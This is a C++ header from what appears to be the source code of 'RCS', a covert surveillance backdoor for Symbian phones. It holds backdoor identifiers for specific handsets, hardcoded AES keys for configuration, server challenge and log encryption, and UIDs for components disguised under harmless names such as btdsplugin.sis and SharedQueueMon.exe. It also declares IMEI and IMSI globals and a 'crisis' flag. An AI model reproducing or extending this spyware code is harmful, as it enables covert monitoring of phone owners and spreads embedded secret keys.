/*
 * Keys.h
 *
 *  Created on: 13/feb/2011
 *      Author: Giovanna
 */

#ifndef KEYS_H_
#define KEYS_H_

#include <e32std.h>
#include <e32base.h>

#define K_KEY_SIZE 16   //TODO: substitute in all places where 16 has been used instead

//_LIT8(KVERSION, "\x1e\x98\xdd\x77");  //2011011102
//_LIT8(KVERSION,"\x25\xea\xdd\x77");  //2011032101
//_LIT8(KVERSION,"\x26\xea\xdd\x77");  //2011032102
//_LIT8(KVERSION,"\x27\xea\xdd\x77");		//2011032103
//_LIT8(KVERSION,"\x35\x5c\xde\x77");		//2011061301
//_LIT8(KVERSION,"\x36\x5c\xde\x77");		//2011061302
//_LIT8(KVERSION,"\x01\xd1\xde\x77");		//2011091201
//_LIT8(KVERSION,"\x61\x25\xdf\x77");		//2011112801 7.5
//_LIT8(KVERSION,"\x81\x51\xed\x77");  //2012041601  8.0 
//_LIT8(KVERSION,"\x82\x51\xed\x77");  //2012041602  8.04 
//_LIT8(KVERSION,"\x19\xa5\xed\x77");  //2012063001  8.1 
//_LIT8(KVERSION,"\x1a\xa5\xed\x77");  //2012063002  8.1.4
//_LIT8(KVERSION,"\xf5\x40\xee\x77");  //2012102901  8.2
//_LIT8(KVERSION,"\xf6\x40\xee\x77");  //2012102902  8.2
_LIT8(KVERSION,"\xbd\x6a\xfc\x77");  //2013031101  8.3



// KEY Section

_LIT8(KIV, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00");

// Backdoor Id
#ifdef _DEBUG
//_LIT8(KBACKDOORID, "RCS_0000000317\x00\x00");    //backdoor su prod/castore N97Mini
//_LIT8(KBACKDOORID, "RCS_0000000205\x00\x00");    //backdoor su prod N81
//_LIT8(KBACKDOORID, "RCS_0000000028\x00\x00");    //backdoor su preprod/polluce N96
//_LIT8(KBACKDOORID, "RCS_0000000475\x00\x00");    //backdoor su prod E61
//_LIT8(KBACKDOORID, "RCS_0000000453\x00\x00");    //backdoor su prod N97Mini UNINSTALL
//_LIT8(KBACKDOORID, "RCS_0000000135\x00\x00");    //backdoor su prod/castore E72
//_LIT8(KBACKDOORID, "RCS_0000000455\x00\x00");    //backdoor su prod/castore E71
//_LIT8(KBACKDOORID, "RCS_0000000793\x00\x00");    //backdoor su prod/castore E71BaseConf
//_LIT8(KBACKDOORID, "RCS_0000000834\x00\x00");    //backdoor su prod/castore E71AdvConf
//_LIT8(KBACKDOORID, "RCS_0000000844\x00\x00");    //backdoor su prod/castore E71TestConf
//_LIT8(KBACKDOORID, "RCS_0000000941\x00\x00");    //backdoor su prod/castore N96Test
_LIT8(KBACKDOORID, "RCS_0000000976\x00\x00");    //backdoor su prod/castore E71PasswdAgent
//_LIT8(KBACKDOORID, "RCS_0000000917\x00\x00");    //backdoor su prod/castore E7-00
//_LIT8(KBACKDOORID, "RCS_0000000020\x00\x00");    //backdoor su polluce E7-00
//_LIT8(KBACKDOORID, "RCS_0000000184\x00\x00");    //backdoor su demo E7Demo
//_LIT8(KBACKDOORID, "RCS_0000000987\x00\x00");	//backdoor su castore N97Mini
//_LIT8(KBACKDOORID, "RCS_0000000061\x00\x00");	//backdoor su polluce N97Mini
//_LIT8(KBACKDOORID, "RCS_0000000005\x00\x00");	//backdoor su demo E71
#else
//_LIT8(KBACKDOORID, "av3pVck1gb4eR2\x00\x00");
_LIT8(KBACKDOORID, "EMp7Ca7-fpOBIr\x00\x00");  //since 8.1.4
#endif

// ConfKey
#ifdef _DEBUG
//_LIT8(KAES_CONFIG_KEY,"2aea9bec25ee2bfc8b4ab86d24a4d7b8"); //RCS_0000000317  //N97mini prod/castore
//_LIT8(KAES_CONFIG_KEY,"\x7c\xdd\xcb\x1b\x75\xb6\xf7\x02\xa2\x1c\x4f\x91\x7e\xa7\xc2\x01"); //RCS_0000000455  //8.0 E71 castore
//_LIT8(KAES_CONFIG_KEY,"\xfa\x52\x83\xd8\xc9\x25\x5f\x71\xf7\x52\x9a\x4d\x86\x32\xfb\x63"); //RCS_0000000834 E71AdvConf 8.0 castore
//_LIT8(KAES_CONFIG_KEY,"\xaa\x4f\xae\x59\x5e\x04\x88\x07\x16\x5c\x73\x0b\x03\x5d\xf5\x2b"); //RCS_0000000844 E71TestConf 8.0 castore
//_LIT8(KAES_CONFIG_KEY,"\x18\x97\x09\xfc\xab\xfb\x5c\x66\xf1\xc9\xd7\xa3\x0b\xf3\xbe\x1b"); //RCS_0000000941 N96Test castore
//_LIT8(KAES_CONFIG_KEY,"\xf8\x4d\xbe\xec\x82\x5b\x60\x7b\x86\x8e\x96\x33\x65\x16\xaa\x89"); //RCS_0000000846 N96AdvConf 8.0 castore
//_LIT8(KAES_CONFIG_KEY,"\x7e\x0f\x09\xbe\xd0\x5d\x4f\x0e\xa6\xb7\x59\x4e\xfa\x1d\x4c\xdb\xb6\x10\x15\x8c\xd6\x36\x5c\x47\x0e\x7a\x6b\x6a\xec\x6b\x00\x4a"); //8.0 //RCS_0000000125  //N96 prod/castore
//_LIT8(KAES_CONFIG_KEY,"\x8c\xae\x3c\x42\x86\xe5\xab\x54\x34\x13\xcc\x92\xd7\x0b\x2a\x72"); //RCS_0000000917  //E7-00 prod/castore
//_LIT8(KAES_CONFIG_KEY,"\xaa\xb9\x0f\x3c\x23\x79\xc7\x61\x88\x83\x25\x5a\x9c\xd6\xb0\xe2"); //RCS_0000000184  //E7Demo demo
_LIT8(KAES_CONFIG_KEY,"\x21\x52\x53\x25\xa9\x39\x2f\x35\xc9\xe7\xe7\xeb\xea\xe5\x18\x87"); //RCS_0000000976  //E71PasswdAgent prod/castore
//_LIT8(KAES_CONFIG_KEY,"\x4f\x45\xc5\xbf\x09\x47\x0f\x6f\xc0\xcf\x03\xb6\xea\x4d\x5d\x31"); //RCS_0000000987  //N97Mini castore
//_LIT8(KAES_CONFIG_KEY,"\x29\x1e\x2a\x86\xb5\x8a\x6c\x03\x85\x92\x61\xd6\x52\xcc\xec\x8e"); //RCS_0000000061  //N97Mini polluce
//_LIT8(KAES_CONFIG_KEY,"\xef\xca\xb8\xbc\xcf\xf0\x96\xf1\xdd\xc3\x6c\x12\x80\x36\x32\x79"); //RCS_0000000005  //E71 demo
#else
//_LIT8(KAES_CONFIG_KEY, "Adf5V57gQtyi90wUhpb8Neg56756j87R");
_LIT8(KAES_CONFIG_KEY, "6uo_E0S4w_FD0j9NEhW2UpFw9rwy90LY");  //since 8.1.4
#endif

//Challenge key or Signature, the same for all bkdoors on the same server
#ifdef _DEBUG
//_LIT8(KAES_CHALLENGE_KEY, "\xe1\x51\x59\xf7\x4b\x56\x7d\x4c\x68\x42\xb6\x9b\xb1\xe3\x41\x27"); //rcs-demo
_LIT8(KAES_CHALLENGE_KEY, "\x57\x2e\xbc\x94\x39\x12\x81\xcc\xf5\x3a\x85\x13\x30\xbb\x0d\x99"); //Signature 8.0 castore
//_LIT8(KAES_CHALLENGE_KEY, "\x66\x3b\xa6\x70\x50\x2a\x7b\xe4\x68\xf7\x00\x79\xfb\x69\xee\xfd"); //Signature 8.0 castore
//_LIT8(KAES_CHALLENGE_KEY, "840da4c68e7dbca9f927de9314e0b586"); //preprod/polluce
#else
//_LIT8(KAES_CHALLENGE_KEY, "f7Hk0f5usd04apdvqw13F5ed25soV5eD");
_LIT8(KAES_CHALLENGE_KEY, "ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ");  // since 8.1.4
#endif

//Log key
#ifdef _DEBUG
//_LIT8(KAES_LOGS_KEY, "95dac559b0edfffc543b06b46c43e610");  //RCS_0000000317  //N97Mini su prod/castore
//_LIT8(KAES_LOGS_KEY, "\x59\x7c\xd8\x9c\x7e\x39\xd3\x95\x43\x81\x13\xda\x1c\x87\x99\x40");  //RCS_0000000455  //E71 castore 8.0
//_LIT8(KAES_LOGS_KEY,"\xae\xd1\xd8\x7a\x00\x25\xb0\x23\x7a\x7b\x59\x9c\x96\x6d\x47\x3c"); // RCS_0000000793 E71BaseConf 8.0 castore
//_LIT8(KAES_LOGS_KEY,"\xee\x38\x59\x36\x1b\x7e\x5c\x23\xeb\x32\x4f\xcf\x8d\x42\x76\xb3");  // RCS_0000000834 // E71AdvConf 8.0 su castore
//_LIT8(KAES_LOGS_KEY,"\x8a\x5c\xe6\x45\x09\xb0\xc5\xeb\xaf\x12\x40\x72\x17\xda\x3f\xc2");  // RCS_0000000844 // E71TestConf 8.0 su castore
//_LIT8(KAES_LOGS_KEY,"\x55\xd5\x26\x00\xce\x46\xd5\x77\x12\xaf\xde\x40\xd1\x2b\x22\x92");  // RCS_0000000941 N96Test su castore
//_LIT8(KAES_LOGS_KEY, "\x02\xab\x00\xbe\x97\xa4\x61\xfe\xdf\x9c\xee\xac\xb0\xef\x73\xf3\x68\x99\x2c\xad\x79\xf2\x5c\x8e\x26\xa7\x67\x3b\x7f\xb7\xb9\x40");  //8.0 //RCS_0000000125  //N96 prod/castore
//_LIT8(KAES_LOGS_KEY, "\x4f\x51\x94\x26\xbb\xad\x92\x1d\xc4\x23\x25\xab\xaf\x2e\xa7\x14");  //RCS_0000000917  //E7-00 prod/castore
//_LIT8(KAES_LOGS_KEY, "\x86\xe3\x1c\x88\x31\x30\xb9\x84\xbf\x3c\xe5\xb1\x9c\x03\x28\x8a");  //RCS_0000000917  //E7-00 polluce
//_LIT8(KAES_LOGS_KEY, "\xd0\xd6\x9c\x9d\xeb\x9a\xea\xb8\xbe\x8e\xf1\x0c\xaa\x8d\xa1\x27");  //RCS_0000000184  //E7Demo demo
_LIT8(KAES_LOGS_KEY, "\x31\x03\x25\x37\xaa\xa6\x4c\xc8\xbe\x68\x3a\xc5\x47\xf5\x87\x28");  //RCS_0000000976  //E71PasswdAgent prod/castore
//_LIT8(KAES_LOGS_KEY, "\x40\xf2\x0d\x9e\x2e\xe4\x80\x59\x1b\x85\x57\xe3\xdb\x38\xfd\xcc");  //RCS_0000000987  //N97Mini castore
//_LIT8(KAES_LOGS_KEY, "\x9b\xd7\x39\x3b\xfe\xa8\x6b\x91\x14\x66\x19\xc4\x2a\xe7\x16\x1f");  //RCS_0000000061  //N97Mini polluce
//_LIT8(KAES_LOGS_KEY, "\x39\x17\xb7\xf0\xf1\x89\xe3\x30\x18\x13\x2e\x4a\x33\x10\xa8\x30");  //RCS_0000000005  //E71 demo
#else
//_LIT8(KAES_LOGS_KEY, "3j9WmmDgBqyU270FTid3719g64bP4s52");
_LIT8(KAES_LOGS_KEY, "WfClq6HxbSaOuJGaH5kWXr7dQgjYNSNg");  // since 8.1.4
#endif

// Random_seed, used as a random seed when/if needed
_LIT8(KRANDOM_SEED,"B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW");

// UID Section

#ifdef _DEBUG
//_LIT8(KUidBackdoor,"0x20024d7a");   // fake btdsplugin.sis (encapsulates all executables below)
_LIT8(KUidBackdoor,"0x200305D7");   // btdsplugin.sis (encapsulates all executables below)
#else
_LIT8(KUidBackdoor,"0x[:UID1:]");
#endif
#ifdef _DEBUG
//_LIT8(KUidCore,"0x2002aa96");		// fake SharedQueueMon.exe
_LIT8(KUidCore,"0x20030635");		// SharedQueueMon.exe
#else
_LIT8(KUidCore,"0x[:UID2:]");
#endif
#ifdef _DEBUG
//_LIT8(KUidSQSrv,"0x200246be");		// fake SharedQueueSrv.exe  
_LIT8(KUidSQSrv,"0x20030634");		// SharedQueueSrv.exe
#else
_LIT8(KUidSQSrv,"0x[:UID3:]");
#endif
#ifdef _DEBUG
//_LIT8(KUidSQCli,"0x2002b30d");		// fake SharedQueueCli.dll 
_LIT8(KUidSQCli,"0x20030633");		// SharedQueueCli.dll
#else
_LIT8(KUidSQCli,"0x[:UID4:]");
#endif
#ifdef _DEBUG
//_LIT8(KUidUninstaller,"0x20030de3");  // fake Uninstaller.exe and Uninstaller.sis 
_LIT8(KUidUninstaller,"0x200305DB");  // Uninstaller.exe and Uninstaller.sis 
#else
_LIT8(KUidUninstaller,"0x[:UID5:]");
#endif
#ifdef _DEBUG
//_LIT8(KUidMonitor,"0x2000c83e");	  // fake UninstMonitor.exe	
_LIT8(KUidMonitor,"0x200316ED");	  // UninstMonitor.exe	
#else
_LIT8(KUidMonitor,"0x[:UID6:]");
#endif

inline 
TUid GetUid(const TDesC8& aUidBuf)
	{
	TBuf8<12> hexBuf(aUidBuf);
	hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
	TLex8 lex(hexBuf);
	TUint32 uid;
	lex.Val(uid,EHex);
	TUid kUid = TUid::Uid(uid);
	return kUid;	
	}

/**
KPropertyUidCore
Property reserved for the core
*/
const TUid KPropertyUidCore = GetUid(KUidCore);
/**
KPropertyFreeSpaceThreshold
The key to observe changes in available space on disk.
Will be updated when the threshold is passed: 1=below threshold, 0=above threshold
*/
const TUint KPropertyFreeSpaceThreshold = 2; 
/**
 * KPropertyStopSubactions
 * The key to stop subactions when stop=true into sync params
 * Will be updated during every sync; 1 = stop subactions, 0 = do not stop subactions
 */
const TUint KPropertyStopSubactions = 3;
/**
 * KPropertyCrisis
 * The key to notify when a crisis is ongoing.
 * Will be updated by crisis module; 1 = crisis on, 0 = crisis off 
 */
const TUint KPropertyCrisis = 4;

extern TBuf<50>   	iGlobalImei;
extern TBuf<15>		iGlobalImsi;
extern TBuf8<16>     iSymbianSubtype;

#endif /* KEYS_H_ */
